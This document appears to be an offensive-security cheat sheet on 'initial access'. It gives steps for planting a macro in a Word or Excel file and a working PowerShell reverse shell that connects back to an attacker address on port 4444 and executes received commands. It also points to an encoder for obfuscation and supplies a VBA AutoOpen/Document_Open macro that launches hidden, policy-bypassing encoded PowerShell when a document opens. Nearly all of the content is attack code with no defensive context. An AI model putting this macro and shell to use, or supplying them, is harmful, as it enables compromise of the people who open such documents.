## Initial Access

### Office Macro

- Open microsoft word or excel.
- Go to view -> macros -> view macros.
- Change macros in to the current file.
- Give your macro any name.
- Click create.
- Clear the editor.
- Paste your macro.
- Close the editor window.
- Save the document as doc or docm.

### Powershell Reverse Shell

1- The original powershell reverse shell.
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.9",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

2- Encode the powershell using: https://raikia.com/tool-powershell-encoder/

3- The full encoded macro powershell reverse shell.
```
Sub AutoOpen()
 MyMacro
End Sub

Sub Document_Open()
 MyMacro
End Sub

Sub MyMacro()
 CreateObject("Wscript.Shell").Run "powershell.exe -w hidden -exec bypass -enc " _
 & ""
End Sub
```
